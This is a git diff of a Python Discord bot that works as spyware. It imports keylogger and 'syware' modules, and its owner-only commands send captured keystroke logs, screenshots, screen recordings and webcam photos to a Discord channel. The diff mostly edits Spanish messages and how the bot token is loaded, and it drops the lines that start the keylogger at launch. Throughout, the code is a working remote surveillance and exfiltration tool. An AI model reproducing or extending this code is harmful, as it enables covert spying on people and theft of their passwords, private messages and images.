@@ -8,30 +8,29 @@ import keylogger as key
 import syware as video   
 import asyncio
 
-#discor
-dotenv.load_dotenv()
+#discord
+env = dotenv.find_dotenv('Tokkens.env')
+dotenv.load_dotenv(env)
 TOKEN = os.getenv('DISCORD_TOKEN')
 
 if not TOKEN:
-    raise ValueError("no se encontro el token ")
+    raise ValueError("No se encontro el TOKEN")
 
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix='!', intents=intents)
-
 key_logger = key.Keylog()
-key_logger.pathCheck()
-key_logger.start_listening() 
 
 @bot.event
 async def on_ready():
     print(f'Bot {bot.user.name} conectado!')
     await bot.change_presence(activity=discord.Game(name="Escribe !ayuda"))
 
+
 @bot.command()
 @commands.is_owner()
 async def logs(ctx):
-    "se nesesita permisos del admin"
+    "se necesitan permisos de admin"
     try:
         await ctx.send(file=discord.File(key_logger.keyslog))
     except Exception as e:
@@ -40,7 +39,7 @@ async def logs(ctx):
 @bot.command()
 @commands.is_owner()
 async def capture(ctx):
-    "se nesesita permisos del admin"
+    "se necesitan permisos de admin"
     try:
         screen = video.screenshot()
         screen.checkpath()
@@ -52,7 +51,7 @@ async def capture(ctx):
 @bot.command()
 @commands.is_owner()
 async def record(ctx):
-    "se nesesita permisos del admin "
+    "Se necesitan permisos del admin "
     try:
         await ctx.send("Grabando video")
         recorder = video.videotake()
@@ -65,9 +64,9 @@ async def record(ctx):
 @bot.command()
 @commands.is_owner()
 async def webcam(ctx):
-    "se nesesita permisos del admin "
+    "se necesitan permisos del admin "
     try:
-        await ctx.send("tomando pantallaso")
+        await ctx.send("Tomando captura de camara")
         cam = video.camtake()
         cam.checkpath()
         cam.takecamphoto()
@@ -78,7 +77,7 @@ async def webcam(ctx):
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.NotOwner):
-        await ctx.send("no tienes permisos de admin")
+        await ctx.send("No tienes permisos de admin")
     else:
         print(f"Error: {error}")
 
